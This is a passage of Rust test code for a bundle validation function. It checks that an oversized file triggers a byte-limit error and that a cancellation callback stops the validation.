    let mut clean_input = input.clone();
    clean_input.existing_case_ids = &[];
    let Ok(tight_file_limits) = BundleLimits::new(8, 8, 8, 8, 8, 8, 16, 1024, 1024, 64) else {
        return;
    };
    assert_eq!(
        validate_and_stage_bundle(&clean_input, &supported, tight_file_limits, || Ok(())),
        Err(BundleError::LimitExceeded {
            limit: BundleLimitKind::FileBytes,
            actual: REPORT_V1.len(),
            max: 16,
        })
    );

    // Honors cooperative cancellation.
    assert_eq!(
        validate_and_stage_bundle(
            &clean_input,
            &supported,
            BundleLimits::default_limits(),
            || Err(StopReason::Cancelled)
        ),
        Err(BundleError::Stopped(StopReason::Cancelled))
    );
}
